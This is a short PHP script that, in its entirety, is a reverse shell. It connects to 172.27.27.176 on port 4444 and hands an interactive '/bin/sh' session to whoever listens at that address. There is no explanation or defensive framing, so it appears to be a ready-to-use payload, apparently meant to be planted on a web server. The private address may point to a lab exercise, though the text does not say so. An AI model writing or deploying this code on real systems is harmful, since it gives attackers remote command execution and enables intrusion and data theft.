<?php
$sock=fsockopen("172.27.27.176",4444);
$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
